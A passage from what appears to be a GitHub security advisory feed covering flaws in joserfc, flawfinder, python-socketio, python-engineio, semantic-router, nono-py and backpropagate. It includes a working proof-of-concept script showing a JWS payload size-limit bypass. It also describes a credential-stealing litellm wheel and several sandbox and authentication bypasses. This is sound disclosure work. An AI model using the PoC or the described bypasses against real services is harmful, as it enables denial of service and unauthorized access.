<pre><code class="language-text">if is_rfc7797_enabled(protected):
    if not payload_segment and payload:
        payload_segment = to_bytes(payload)
    payload = payload_segment
</code></pre>
<p>The flattened JSON RFC7797 path has the same pattern:</p>
<pre><code class="language-text">payload_segment = value["payload"].encode("utf-8")
if is_rfc7797_enabled(member.headers()):
    payload = payload_segment
</code></pre>
<p>Neither branch calls <code>registry.validate_payload_size(payload_segment)</code> before accepting the unencoded payload.</p>
<h2 id="reproduction">Reproduction</h2>
<p>The proof below uses only local Python APIs. It signs a payload one byte over the default limit and then compares normal JWS behavior with RFC7797 <code>b64=false</code> behavior.</p>
<p>Requirements:</p>
<pre><code class="language-bash">python -m pip install "joserfc==1.6.5"
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">python joserfc_rfc7797_size_bypass_poc.py
</code></pre>
<p>Self-contained proof script:</p>
<pre><code class="language-python">#!/usr/bin/env python3
import json

import joserfc
from joserfc import jws
from joserfc.jwk import OctKey


def check_compact(name, header, payload, key):
    token = jws.serialize_compact(header, payload, key)
    try:
        obj = jws.deserialize_compact(token, key)
        return {
            "case": name,
            "accepted": True,
            "exception": None,
            "payload_len_after_deserialize": len(obj.payload),
        }
    except Exception as exc:
        return {
            "case": name,
            "accepted": False,
            "exception": type(exc).__name__,
            "error": str(exc),
        }


def check_json(name, protected, payload, key):
    data = jws.serialize_json({"protected": protected}, payload, key)
    try:
        obj = jws.deserialize_json(data, key)
        return {
            "case": name,
            "accepted": True,
            "exception": None,
            "payload_len_after_deserialize": len(obj.payload),
        }
    except Exception as exc:
        return {
            "case": name,
            "accepted": False,
            "exception": type(exc).__name__,
            "error": str(exc),
        }


key = OctKey.import_key("secret-secret-secret")
limit = jws.default_registry.max_payload_length
payload = "A" * (limit + 1)

results = {
    "joserfc_version": joserfc.__version__,
    "default_max_payload_length": limit,
    "payload_len": len(payload),
    "compact": [
        check_compact("normal_b64_true", {"alg": "HS256"}, payload, key),
        check_compact(
            "rfc7797_b64_false",
            {"alg": "HS256", "b64": False, "crit": ["b64"]},
            payload,
            key,
        ),
    ],
    "json": [
        check_json("normal_b64_true_json", {"alg": "HS256"}, payload, key),
        check_json(
            "rfc7797_b64_false_json",
            {"alg": "HS256", "b64": False, "crit": ["b64"]},
            payload,
            key,
        ),
    ],
}
print(json.dumps(results, indent=2, sort_keys=True))
</code></pre>
<p>Expected output on <code>1.6.5</code> includes:</p>
<pre><code class="language-json">{
  "default_max_payload_length": 128000,
  "payload_len": 128001,
  "compact": [
    {
      "case": "normal_b64_true",
      "accepted": false,
      "exception": "ExceededSizeError"
    },
    {
      "case": "rfc7797_b64_false",
      "accepted": true,
      "exception": null,
      "payload_len_after_deserialize": 128001
    }
  ],
  "json": [
    {
      "case": "normal_b64_true_json",
      "accepted": false,
      "exception": "ExceededSizeError"
    },
    {
      "case": "rfc7797_b64_false_json",
      "accepted": true,
      "exception": null,
      "payload_len_after_deserialize": 128001
    }
  ]
}
</code></pre>
<h2 id="version-checks">Version Checks</h2>
<p>I reproduced the same differential behavior on these releases:</p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Normal JWS over limit</th>
<th>RFC7797 <code>b64=false</code> over limit</th>
</tr>
</thead>
<tbody><tr>
<td>1.3.4</td>
<td><code>ExceededSizeError</code></td>
<td>accepted</td>
</tr>
<tr>
<td>1.3.5</td>
<td><code>ExceededSizeError</code></td>
<td>accepted</td>
</tr>
<tr>
<td>1.4.2</td>
<td><code>ExceededSizeError</code></td>
<td>accepted</td>
</tr>
<tr>
<td>1.6.2</td>
<td><code>ExceededSizeError</code></td>
<td>accepted</td>
</tr>
<tr>
<td>1.6.3</td>
<td><code>ExceededSizeError</code></td>
<td>accepted</td>
</tr>
<tr>
<td>1.6.4</td>
<td><code>ExceededSizeError</code></td>
<td>accepted</td>
</tr>
<tr>
<td>1.6.5</td>
<td><code>ExceededSizeError</code></td>
<td>accepted</td>
</tr>
</tbody></table>
<p>The exact earliest affected release may be broader. The versions above are the releases I directly tested where the JWS size-limit boundary exists and the RFC7797 path bypasses it.</p>
<h2 id="relationship-to-existing-advisories">Relationship to Existing Advisories</h2>
<p>I found two related public advisories for <code>joserfc</code>, but neither appears to cover this root cause.</p>
<p><code>GHSA-frfh-8v73-gjg4</code> / <code>CVE-2025-65015</code> describes oversized token parts being included in <code>ExceededSizeError</code> messages in older release ranges. The issue described here reproduces in <code>1.6.5</code> and is not about exception message content. The oversized RFC7797 payload is accepted instead of raising <code>ExceededSizeError</code>.</p>
<p><code>GHSA-w5r5-m38g-f9f9</code> / <code>CVE-2026-27932</code> describes unbounded PBES2 <code>p2c</code> iteration counts during JWE decryption. The issue described here is in JWS RFC7797 payload extraction and does not involve PBES2 or JWE decryption.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Before a fixed release is available, affected applications can reduce exposure by rejecting oversized serialized JWS inputs before passing them to <code>joserfc</code>, disabling or disallowing RFC7797 <code>b64=false</code> tokens if not needed, and enforcing strict request/header/body size limits at the application or reverse-proxy layer.</p>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Apply <code>registry.validate_payload_size(payload_segment)</code> to RFC7797 unencoded payloads before assigning them to the JWS object in both compact and flattened JSON extraction paths. Detached RFC7797 compact payloads supplied through the <code>payload</code> argument should be checked in the same way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authlib/joserfc/security/advisories/GHSA-wphv-vfrh-23q5">https://github.com/authlib/joserfc/security/advisories/GHSA-wphv-vfrh-23q5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48990">https://nvd.nist.gov/vuln/detail/CVE-2026-48990</a></li>
<li><a href="https://github.com/authlib/joserfc/releases/tag/1.6.7">https://github.com/authlib/joserfc/releases/tag/1.6.7</a></li>
<li><a href="https://github.com/advisories/GHSA-wphv-vfrh-23q5">https://github.com/advisories/GHSA-wphv-vfrh-23q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wphv-vfrh-23q5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T20:59:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flawfinder] Flawfinder output manipulation via untrusted filenames and source text]]></title>
        <id>https://github.com/advisories/GHSA-4c3c-r6p8-c863</id>
        <link href="https://github.com/advisories/GHSA-4c3c-r6p8-c863"/>
        <updated>2026-06-26T20:52:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability is an improper input neutralization issue leading to output manipulation, specifically, Terminal/ANSI Escape Sequence Injection and XML Injection:</p>
<ul>
<li><p>Terminal Output Spoofing: A malicious file whose name contains ANSI escape sequences can end up being included in flawfinder's standard terminal output, with many effects. For example, this might allow an attacker to hide critical scan results, falsely making it appear to a human reviewer that no security issues were found.</p>
</li>
<li><p>CSV and XML Injection: Untrusted fields (such as filenames, categories, or code context text) were not properly sanitized when generating structured reports. An attacker could exploit this to corrupt CSV formats or inject arbitrary XML attributes into SonarQube outputs via output_sonar().</p>
</li>
</ul>
<p>It impacts those who use flawfinder to evaluate intentionally malicious filenames or file contents.</p>
<p>The initial filename injection problem was reported by Dan Lenz <a href="https://www.linkedin.com/in/dan-lenz/">https://www.linkedin.com/in/dan-lenz/</a></p>
<p>The other vulnerabilities were found by flawfinder project leader David A. Wheeler, GitHub david-a-wheeler, <a href="https://dwheeler.com/">https://dwheeler.com/</a></p>
<h3 id="patches">Patches</h3>
<p>This issue has been fully patched in Version 2.0.20 (released 2026-05-16). All users should upgrade to version 2.0.20 or later immediately. If you use Python's package manager, you can upgrade using <code>pip install --upgrade flawfinder</code>. If you are consuming flawfinder via GitHub Actions, ensure your workflow points to david-a-wheeler/<a href="mailto:flawfinder@2.0.20">flawfinder@2.0.20</a> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no configuration-based workaround within older versions of flawfinder. If an immediate upgrade is not possible, users can mitigate the risk by:</p>
<ul>
<li><p>Pre-scanning filenames: Manually or programmatically verifying that target repositories do not contain filenames with control characters (including ANSI escape sequences) before passing them to flawfinder.</p>
</li>
<li><p>Inspecting raw output: Reviewing flawfinder outputs in a text editor or logging mechanism that explicitly displays or strips raw escape sequences, rather than relying on live terminal rendering.</p>
</li>
<li><p>Restricting untrusted inputs: Avoiding the generation of SonarQube or CSV reports from completely untrusted repositories until the tool is updated.</p>
</li>
</ul>
<h3 id="resources">Resources</h3>
<p>See the flawfinder GitHub Repository: <a href="https://github.com/david-a-wheeler/flawfinder">https://github.com/david-a-wheeler/flawfinder</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/david-a-wheeler/flawfinder/security/advisories/GHSA-4c3c-r6p8-c863">https://github.com/david-a-wheeler/flawfinder/security/advisories/GHSA-4c3c-r6p8-c863</a></li>
<li><a href="https://github.com/advisories/GHSA-4c3c-r6p8-c863">https://github.com/advisories/GHSA-4c3c-r6p8-c863</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4c3c-r6p8-c863</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-26T20:52:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-socketio] python-socketio: Binary attachment accumulation can cause denial of service]]></title>
        <id>https://github.com/advisories/GHSA-5w7q-77mv-v69f</id>
        <link href="https://github.com/advisories/GHSA-5w7q-77mv-v69f"/>
        <updated>2026-06-26T20:51:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The python-socketio server stores binary <code>EVENT</code> and <code>ACK</code> messages in memory while it waits to receive their binary attachments. Once all the attachments are received, these messages are then processed. An attacker can submit a binary message and intentionally omit sending one or more of its attachments to cause the message along with the partial list of received attachments to stay in memory for a long time.</p>
<h3 id="patches">Patches</h3>
<p>Version 5.16.2 takes the following measures to address this issue:</p>
<ul>
<li>Binary packets are only accepted from authenticated clients.</li>
<li>When a client disconnects, the server checks if there is a partial binary message being held for the client and deletes it.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/miguelgrinberg/python-socketio/security/advisories/GHSA-5w7q-77mv-v69f">https://github.com/miguelgrinberg/python-socketio/security/advisories/GHSA-5w7q-77mv-v69f</a></li>
<li><a href="https://github.com/advisories/GHSA-5w7q-77mv-v69f">https://github.com/advisories/GHSA-5w7q-77mv-v69f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5w7q-77mv-v69f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T20:51:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-engineio] python-engineio has unbound thread allocation that can cause denial of service]]></title>
        <id>https://github.com/advisories/GHSA-cgwc-pv48-fhj5</id>
        <link href="https://github.com/advisories/GHSA-cgwc-pv48-fhj5"/>
        <updated>2026-06-26T20:51:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can cause the creation of unnecessary background threads in the python-engineio server by exploiting the heartbeat mechanism, which launches a thread when a new connection is received, and when the client sends a PONG packet.</p>
<p>Note: this issue primarily affects synchronous servers. Asynchronous servers allocate background tasks instead of physical threads, which are lightweight and less likely to cause denial of service. However, the fix that was implemented was also applied to the asynchronous case.</p>
<h3 id="patches">Patches</h3>
<p>Version 4.13.2 addresses this issue as follows:</p>
<ul>
<li>The initial background thread (or async task( for heartbeat management is only launched if a client passes authentication in the <code>connect</code> handler.</li>
<li>The server now ensures that there is only one background heatbeat thread (or async task) per client at a given point in time. Out of sequence PONG packets are now discarded when an active heartbeat thread is already running.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/miguelgrinberg/python-engineio/security/advisories/GHSA-cgwc-pv48-fhj5">https://github.com/miguelgrinberg/python-engineio/security/advisories/GHSA-cgwc-pv48-fhj5</a></li>
<li><a href="https://github.com/advisories/GHSA-cgwc-pv48-fhj5">https://github.com/advisories/GHSA-cgwc-pv48-fhj5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cgwc-pv48-fhj5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T20:51:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[semantic-router] semantic-router exposed to compromised litellm wheel (CVE-2026-42208) via unbounded transitive pin]]></title>
        <id>https://github.com/advisories/GHSA-98x5-vq43-vc5p</id>
        <link href="https://github.com/advisories/GHSA-98x5-vq43-vc5p"/>
        <updated>2026-06-26T20:51:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>semantic-router versions 0.1.8 through 0.1.14 declare <code>litellm&gt;=1.61.3</code> with no upper bound. During the window in which <code>litellm==1.82.8</code> was the latest release on PyPI, a fresh install of any affected semantic-router version could resolve to that compromised wheel.</p>
<p>The malicious <code>litellm==1.82.8</code> wheel ships a <code>litellm_init.pth</code> file that executes on Python interpreter startup — no import required. It collects and exfiltrates:</p>
<ul>
<li>Process environment variables</li>
<li>AWS / GCP / Azure credentials</li>
<li>SSH keys, Kubernetes configs, shell history</li>
<li>Database credentials and CI/CD secrets</li>
<li>Cryptocurrency wallets</li>
</ul>
<p>Stage-two payload encrypts the collected data (AES-256 + embedded RSA pubkey) and POSTs it to <code>https://models.litellm.cloud/</code>.</p>
<p>See upstream: <a href="https://github.com/BerriAI/litellm/issues/24512">BerriAI/litellm#24512</a> and <a href="https://www.cve.org/CVERecord?id=CVE-2026-42208">CVE-2026-42208</a>.</p>
<h2 id="patches">Patches</h2>
<p>Fixed in <strong>semantic-router 0.1.15</strong>, which raises the floor to <code>litellm&gt;=1.83.7</code>.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If developers cannot upgrade immediately:</p>
<ul>
<li>Pin <code>litellm&gt;=1.83.7,!=1.82.8</code> explicitly in their own project.</li>
<li>Audit <code>site-packages/</code> for <code>litellm_init.pth</code> and delete if present.</li>
<li>Rotate any credentials reachable from environments where an affected install ran.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Upstream report and triage by the litellm maintainers — see issue <a href="https://github.com/BerriAI/litellm/issues/24512">#24512</a>.</p>
<p>One caveat before publishing</p>
<p>CVE-2026-42208 specifically names 1.82.8. Pip's resolver picks "latest matching", so the real affected blast radius for semantic-router is users who ran pip install during the window that 1.82.8 was on PyPI — not everyone who ever installed 0.1.8–0.1.14. The advisory is still correct (an affected install could have pulled the bad wheel), but consider whether a Severity: Critical / Exploitability: time-bounded note would help downstream readers understand the exposure model.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aurelio-labs/semantic-router/security/advisories/GHSA-98x5-vq43-vc5p">https://github.com/aurelio-labs/semantic-router/security/advisories/GHSA-98x5-vq43-vc5p</a></li>
<li><a href="https://github.com/advisories/GHSA-98x5-vq43-vc5p">https://github.com/advisories/GHSA-98x5-vq43-vc5p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-98x5-vq43-vc5p</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-26T20:51:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-engineio] python-engineio has possible denial of service due to maximum payload size sometimes not being enforced]]></title>
        <id>https://github.com/advisories/GHSA-m9gh-vj53-gvh9</id>
        <link href="https://github.com/advisories/GHSA-m9gh-vj53-gvh9"/>
        <updated>2026-06-26T20:48:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>There are two specific configurations of the python-engineio server in which the size of incoming messages is not checked before the messages are loaded into memory. An attacker can take advantage of these to cause unnecessary memory allocations in the python-engineio server. The two cases are:</p>
<ul>
<li>POST requests, when using ASGI with the long polling transport</li>
<li>WebSocket messages, when using Aiohttp with the WebSocket transport</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Version 4.13.2 addresses this issue as follows:</p>
<ul>
<li>ASGI severs now only load the body of incoming requests into memory after the client is confirmed to be known and authenticated, and the payload size is below the maximum allowed size. Requests that do not comply with these requirements are discarded.</li>
<li>Aiohttp servers configure the maximum payload size in the underlying WebSocket layer from Aiohttp, so that large messages are discarded by Aiohttp before they are delivered to python-engineio.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/miguelgrinberg/python-engineio/security/advisories/GHSA-m9gh-vj53-gvh9">https://github.com/miguelgrinberg/python-engineio/security/advisories/GHSA-m9gh-vj53-gvh9</a></li>
<li><a href="https://github.com/advisories/GHSA-m9gh-vj53-gvh9">https://github.com/advisories/GHSA-m9gh-vj53-gvh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9gh-vj53-gvh9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T20:48:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nono-py] nono-py's policy JSON accepts unknown security fields]]></title>
        <id>https://github.com/advisories/GHSA-m8j6-rc5x-wv36</id>
        <link href="https://github.com/advisories/GHSA-m8j6-rc5x-wv36"/>
        <updated>2026-06-26T20:43:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>nono-py policy handling could fail open in two ways. First, resolving a policy-derived <code>ProxyConfig</code> did not automatically enforce <code>CapabilitySet.proxy_only</code>, allowing sandboxed children to bypass a resolved domain allowlist by using direct network access. Second, policy JSON accepted unknown security-sensitive fields, so misspelled or unsupported restrictions could be silently ignored.</p>
<h3 id="impact">Impact</h3>
<p>A sandboxed child may receive broader network access than the policy author intended. This can allow outbound requests outside the configured proxy allowlist and may expose sensitive data depending on the execution environment and workload.</p>
<h3 id="older-kernel-note">Older-kernel note</h3>
<p>On Linux kernels without Landlock ABI v4 network rules, patched versions continue to support proxy-only enforcement through the seccomp supervisor fallback introduced in 807fb4b. Users on older kernels should ensure policy-resolved proxy configurations are coupled to <code>CapabilitySet.proxy_only(proxy);</code> merely injecting proxy environment variables is not sufficient.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/always-further/nono-py/security/advisories/GHSA-m8j6-rc5x-wv36">https://github.com/always-further/nono-py/security/advisories/GHSA-m8j6-rc5x-wv36</a></li>
<li><a href="https://github.com/nolabs-ai/nono-py/commit/2897ee20df0d75afd298d94840b9d135b3b3a6e9">https://github.com/nolabs-ai/nono-py/commit/2897ee20df0d75afd298d94840b9d135b3b3a6e9</a></li>
<li><a href="https://github.com/nolabs-ai/nono-py/commit/807fb4bce2385b9e88185bf160e0792b588813c7">https://github.com/nolabs-ai/nono-py/commit/807fb4bce2385b9e88185bf160e0792b588813c7</a></li>
<li><a href="https://github.com/advisories/GHSA-m8j6-rc5x-wv36">https://github.com/advisories/GHSA-m8j6-rc5x-wv36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m8j6-rc5x-wv36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T20:41:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nono-py] nono-py vulnerable to authorization bypass / policy confusion]]></title>
        <id>https://github.com/advisories/GHSA-9j7f-3r4p-pwh6</id>
        <link href="https://github.com/advisories/GHSA-9j7f-3r4p-pwh6"/>
        <updated>2026-06-26T20:39:45.000Z</updated>
        <content type="html"><![CDATA[<p>The python API made a restrictive-looking configuration unsafe by default. A caller could configure only reverse-
proxy credential routes, put the child in CapabilitySet.proxy_only, and reasonably expect network access to be limited
to those routes. Instead, because empty allowed_hosts meant allow-all inside nono-proxy, the child could use the local
proxy as a transparent CONNECT tunnel to non-route nominated hosts (not including metadata endpoints).</p>
<p>That is an authorization bypass / policy confusion issue:</p>
<ul>
<li>Intended policy: route-only proxy access.</li>
<li>Actual policy: route-only plus arbitrary transparent CONNECT.</li>
<li>Boundary crossed: sandboxed child gains broader outbound network reach than the Python policy appears to grant.</li>
<li>Impact depends on environment, but it can allow exfiltration or access to unintended internet/internal services
through the unsandboxed proxy.</li>
</ul>
<p>This should be classified as medium severity by default, potentially high if users rely on route-only configs for strict egress
control around untrusted code or sensitive credentials. The fix is security-relevant because it changes the default from
implicit allow-all to explicit opt-in.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/always-further/nono-py/security/advisories/GHSA-9j7f-3r4p-pwh6">https://github.com/always-further/nono-py/security/advisories/GHSA-9j7f-3r4p-pwh6</a></li>
<li><a href="https://github.com/nolabs-ai/nono-py/commit/163fca083a189967b882d1005bfba099fc9a9d63">https://github.com/nolabs-ai/nono-py/commit/163fca083a189967b882d1005bfba099fc9a9d63</a></li>
<li><a href="https://github.com/advisories/GHSA-9j7f-3r4p-pwh6">https://github.com/advisories/GHSA-9j7f-3r4p-pwh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9j7f-3r4p-pwh6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T20:39:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[backpropagate] Backpropagate: backprop ui --auth and backprop ui --share do not enforce authentication]]></title>
        <id>https://github.com/advisories/GHSA-f65r-h4g3-3h9h</id>
        <link href="https://github.com/advisories/GHSA-f65r-h4g3-3h9h"/>
        <updated>2026-06-26T20:34:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In <code>backpropagate &gt;= 1.1.0</code>, the optional Reflex web UI (<code>pip install backpropagate[ui]</code>, launched via <code>backprop ui</code>) exposes a training control plane: dataset upload, model load, training start/stop, multi-run orchestration, GGUF export, and HuggingFace Hub push.</p>
<p>The CLI accepts two operator-facing flags intended as security controls:</p>
<ul>
<li><code>--auth user:pass</code> — documented as "require HTTP Basic authentication on every request to the UI."</li>
<li><code>--share</code> — documented as "expose the UI on a public address; requires <code>--auth</code>."</li>
</ul>
<p>When <code>--auth user:pass</code> is passed, the CLI prints <code>Auth: enabled (user: &lt;username&gt;)</code> to confirm to the operator that authentication is active, then exports <code>BACKPROPAGATE_UI_AUTH=user:pass</code> to the subprocess that launches the Reflex backend.</p>
<p><strong>The Reflex backend (<code>backpropagate/ui_app/**</code>) never reads <code>BACKPROPAGATE_UI_AUTH</code>.</strong> No authentication middleware is registered. No request-level guard runs. No WebSocket upgrade guard runs. Any client that reaches the bound port — local or remote, depending on whether <code>--share</code> is used — has full UI access.</p>
<p>An inline comment at <code>backpropagate/cli.py:1217-1218</code> in the v1.1.0 source documents the gap: <em>"For Phase 1 the variable is exported but Reflex doesn't read it yet."</em> This comment was internal-facing; the user-facing documentation (README, CHANGELOG, SHIP_GATE) advertised the contract as enforced.</p>
<p>This advisory is filed primarily because the runtime contradicted an operator-facing security claim. Code-only bugs of comparable shape (auth check missing entirely from a path) would already warrant disclosure; the additional false-promise dimension raises the severity.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who reaches the bound port can:</p>
<ul>
<li><strong>Read uploaded datasets</strong> rendered in the UI preview, including content of any JSONL/CSV/TXT file the legitimate operator has uploaded for fine-tuning.</li>
<li><strong>Trigger arbitrary training runs</strong> against any base model the operator has installed locally or that can be downloaded from HuggingFace.</li>
<li><strong>Trigger HuggingFace Hub pushes</strong> to repositories named via the UI input (subject to the operator's local HF token's scope — typically all repos owned by the operator).</li>
<li><strong>Cause disk-fill DoS</strong> via the <code>rx.upload</code> endpoint (no size cap, no extension filter, no per-session count cap in v1.1.0 / v1.1.1).</li>
<li><strong>Read model paths</strong> (<code>source_model_path</code>, <code>dataset_path</code>, <code>model</code>, <code>uploaded_path</code>) which are user-supplied and bypass the <code>safe_path()</code> helper that lives in <code>backpropagate/ui_security.py</code> (path validation is dead code on the Reflex surface in v1.1.0 / v1.1.1).</li>
</ul>
<p>The combination of unauthenticated training control, HF push target spoofing, and path-input traversal makes the affected endpoint suitable for both data exfiltration (reading uploaded training data) and supply-chain attacks (pushing tampered model weights to the operator's HF account).</p>
<p>The local-only default (no <code>--share</code>) reduces exposure to a host-local attacker. The <code>--share</code> flag is documented as a "public URL" feature; operators who used <code>--share --auth user:pass</code> had no warning that the auth half was inert.</p>
<h2 id="patches">Patches</h2>
<p>Fixed in <strong>v1.2.0</strong> (released 2026-05-23). The patch implements real ASGI middleware via <code>rx.App(api_transformer=basic_auth_transformer)</code> that gates HTTP routes AND the <code>/_event</code> WebSocket upgrade. Four modes (<code>no_auth_local_only</code> / <code>token_auto</code> / <code>explicit_creds</code> / <code>production</code>), HMAC-signed cookie validated PRE-<code>websocket.accept()</code>, Host + Origin allowlists. The middleware ships alongside a 4-layer defense in depth at the cli.py / ui_app/app.py / rxconfig.py / env-strip surfaces so direct <code>python -m reflex run</code> invocations (bypassing the CLI guard) also enforce authentication.</p>
<p>Upgrade with:</p>
<ul>
<li>pip: <code>pip install --upgrade backpropagate</code></li>
<li>npm: <code>npm install -g @mcptoolshop/backpropagate@latest</code></li>
</ul>
<p>Full release notes: <a href="https://github.com/mcp-tool-shop-org/backpropagate/blob/main/CHANGELOG.md#120---2026-05-23">https://github.com/mcp-tool-shop-org/backpropagate/blob/main/CHANGELOG.md#120---2026-05-23</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>If users cannot upgrade immediately:</p>
<ol>
<li><strong>Do not pass <code>--auth</code> or <code>--share</code> to <code>backprop ui</code>.</strong> Run the UI with no flags (<code>backprop ui</code>); it will bind to <code>localhost</code> and accept any client that can reach <code>127.0.0.1</code>.</li>
<li><strong>For remote access, use SSH port-forwarding</strong> instead of <code>--share</code>:<pre><code># On the client:
ssh -L 7860:localhost:7860 &lt;training-host&gt;
# On the server:
backprop ui            # no --share
# Then open http://localhost:7860 in your local browser.
</code></pre>
SSH provides the authentication layer the Reflex UI did not.</li>
<li><strong>Audit existing deployments.</strong> If any host running <code>backpropagate &gt;= 1.1.0</code> has previously been launched with <code>--share</code>, treat any uploaded training data, model paths, or HF push targets visible in that UI session as potentially exposed. Re-issue HF tokens that have been in use during such sessions.</li>
</ol>
<p><strong>Binary distribution gap.</strong> Standalone binaries (Windows .exe / macOS .app via PyInstaller) failed to build for v1.2.0 and will land in a follow-up patch release. In the interim, users who relied on the v1.1.x binary distribution should install the patched version via <code>pip install backpropagate==1.2.0</code> to receive the auth-bypass fix. The v1.2.0 PyPI package and <code>@mcptoolshop/backpropagate@1.2.0</code> npm package both carry the patched code.</p>
<h2 id="credit">Credit</h2>
<p>Discovered by the dogfood-swarm Stage A audit on 2026-05-22 (finding ID <code>FRONTEND-A-001</code>, classified CRITICAL). The audit also surfaced contradicting documentation in CHANGELOG / SHIP_GATE / README; those were corrected in v1.2.0 alongside the runtime fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mcp-tool-shop-org/backpropagate/security/advisories/GHSA-f65r-h4g3-3h9h">https://github.com/mcp-tool-shop-org/backpropagate/security/advisories/GHSA-f65r-h4g3-3h9h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48797">https://nvd.nist.gov/vuln/detail/CVE-2026-48797</a></li>
<li><a href="https://github.com/mcp-tool-shop-org/backpropagate/releases/tag/v1.2.0">https://github.com/mcp-tool-shop-org/backpropagate/releases/tag/v1.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-f65r-h4g3-3h9h">https://github.com/advisories/GHSA-f65r-h4g3-3h9h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f65r-h4g3-3h9h</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-26T20:34:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nono-py] nono-py has proxy-only network fallback bypass on older Linux kernels]]></title>
        <id>https://github.com/advisories/GHSA-72w7-mf9g-733p</id>
        <link href="https://github.com/advisories/GHSA-72w7-mf9g-733p"/>
        <updated>2026-06-26T20:33:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>On Linux kernels that do not support Landlock network rules, <code>nono_py.sandboxed_exec()</code> could run <code>CapabilitySet.proxy_only(proxy)</code> without supervising the seccomp-notify proxy-only fallback returned by the Rust core.</p>
<p>In that configuration, a sandboxed child process could remove <code>HTTP_PROXY</code> / <code>HTTPS_PROXY</code> environment variables or use raw sockets and then open direct TCP connections that should have been denied by proxy-only policy.</p>
<p>The issue affects proxy-only enforcement. It does not mean that all nono-py network blocking is ineffective. ECS validation showed <code>caps.block_network()</code> denied regular TCP and ECS metadata TCP on the tested Linux 6.1 host.</p>
<h2 id="impact">Impact</h2>
<p>The intended <code>proxy_only()</code> security property is:</p>
<ul>
<li>child processes may connect only to the local nono proxy port</li>
<li>the proxy enforces host allowlists and metadata/link-local denial</li>
<li>direct TCP to any other target is denied</li>
</ul>
<p>Before the fix, on kernels without Landlock <code>AccessNet</code>, the Python binding applied the sandbox and then executed the child, but did not install and supervise the proxy-only seccomp-notify fallback. A child could therefore bypass the proxy layer in that old-kernel path.</p>
<p>The highest-impact scenario is a sandboxed workload with access to cloud metadata discovery inputs, where direct TCP to a metadata endpoint could retrieve task or instance credentials after proxy environment variables are removed.</p>
<h2 id="affected-conditions">Affected Conditions</h2>
<p>The issue requires all of the following:</p>
<ul>
<li>Linux runtime.</li>
